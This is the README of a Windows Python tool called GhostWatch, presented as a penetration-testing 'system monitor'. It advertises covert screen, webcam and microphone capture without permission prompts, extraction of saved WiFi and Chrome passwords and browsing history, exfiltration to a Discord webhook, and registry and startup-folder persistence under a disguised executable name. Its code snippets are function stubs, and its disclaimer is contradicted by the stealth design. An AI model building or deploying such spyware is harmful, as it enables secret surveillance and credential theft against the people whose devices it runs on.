🕵️‍♂️ GhostWatch - Advanced System Monitor
https://img.shields.io/badge/Python-3.8%252B-blue
https://img.shields.io/badge/Platform-Windows-lightgrey
https://img.shields.io/badge/Mode-Stealth-black

"The silent guardian that sees everything, hears everything, and tells no one but you."

GhostWatch is an advanced, self-installing system monitoring tool designed for legitimate penetration testing and authorized security auditing. It operates in complete stealth mode with zero user interaction required.

🚀 Features
🎯 Core Monitoring
📸 Real-time Screenshots - Captures screen every 3 seconds

📷 Stealth Webcam Access - Photos every 30 seconds (no permission prompts)

🎤 Ambient Audio Recording - 10-second recordings every 60 seconds

⚡ Auto-Start Persistence - Installs itself to run on every boot

🔍 Data Extraction
📡 WiFi Credentials - Extracts all saved WiFi passwords

🔑 Browser Passwords - Recovers Chrome saved credentials

🌐 Browsing History - Last 24 hours of Google Chrome history

💾 Auto-Export - All data sent directly to your Discord

🛡️ Stealth Technology
🔒 Zero Permission Prompts - Bypasses all Windows security dialogs

👻 Hidden Execution - Runs without console windows or notifications

🔄 Self-Compiling - Automatically converts to EXE on first run

⚡ Startup Persistence - Multiple auto-start methods for reliability

🛠️ Installation
One-Command Deployment
bash
python ghostwatch.py
That's it! The script will automatically:

✅ Install required dependencies

🔨 Compile itself to an executable

📁 Copy to startup folder

🔗 Add registry startup entries

🚀 Launch the stealth version

📁 Project Structure
text
ghostwatch/
├── ghostwatch.py                 # Main monitoring script
├── WindowsSystemMonitor.exe      # Auto-generated executable
├── dist/                         # Build directory
└── startup_entries/             # Persistence locations
    ├── Startup Folder
    ├── Registry Run Keys
    └── Scheduled Tasks
🔧 Technical Implementation
Stealth Mechanisms
python
# Admin privilege bypass
bypass_privileges()

# Camera/Mic permission bypass  
registry_modifications()

# Hidden process execution
ctypes.windll.user32.ShowWindow(0)
Persistence Methods
Startup Folder: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\

Registry Run Keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Self-Compilation: Auto-converts Python script to standalone EXE

Data Collection
python
# Multi-source data extraction
extract_wifi_passwords()      # Netsh commands
extract_chrome_passwords()    # SQLite database parsing  
extract_browser_history()     # Chrome history timeline
🎮 Usage
Initial Deployment
python
# Simply run once - handles everything automatically
monitor = GhostWatch("YOUR_DISCORD_WEBHOOK")
monitor.start_monitoring()
Monitoring Output
You'll receive real-time updates in your Discord channel:

text
🕵️‍♂️ GHOSTWATCH ACTIVATED
📸 Screenshot #45 - 14:23:11
📷 Webcam Photo #12 - 14:23:45  
🎤 Audio Recording #8 - 14:24:30
📡 WiFi Passwords (8 networks)
🔑 Chrome Credentials (23 logins)
🌐 Recent History (47 sites)
⚠️ Legal Disclaimer
FOR AUTHORIZED TESTING ONLY

This tool is designed for:

✅ Legitimate penetration testing

✅ Authorized security audits

✅ Educational purposes

✅ Personal system monitoring (your own devices)

🚫 PROHIBITED USES:

Unauthorized surveillance

Illegal monitoring activities

Privacy violations

Corporate espionage

The developers assume no liability for misuse. Always ensure you have explicit written permission before deploying any monitoring software.

🔄 Removal
Complete Uninstallation
powershell
# Run in PowerShell as Administrator
Remove-GhostWatch.ps1
Manual Removal Steps
Kill process: taskkill /f /im WindowsSystemMonitor.exe

Delete from startup folder

Remove registry entries

Delete executable files

🛡️ Security Features
Anti-Analysis: Self-compiling architecture

Persistence: Multiple startup mechanisms

Stealth: Zero UI, silent operation

Bypass: Admin and permission escalation

Auto-Cleanup: Temporary file management

📊 Data Flow
text
System Resources → Data Collection → Discord Webhook
     📸📷🎤           🔍📊📈              📨👁️
🎯 Use Cases
Penetration Testing: Internal security assessments

Incident Response: System activity monitoring

Digital Forensics: Evidence collection

Parental Control: Authorized family monitoring

Corporate Security: Employee device auditing (with consent)

🔮 Future Enhancements
Cross-platform support (Linux/macOS)

Encrypted communications

Remote command execution

Keylogging capabilities

Network traffic analysis

Cloud storage integration

⚡ GhostWatch - Because sometimes you need to see without being seen.

"Knowledge is power, but stealth is survival."
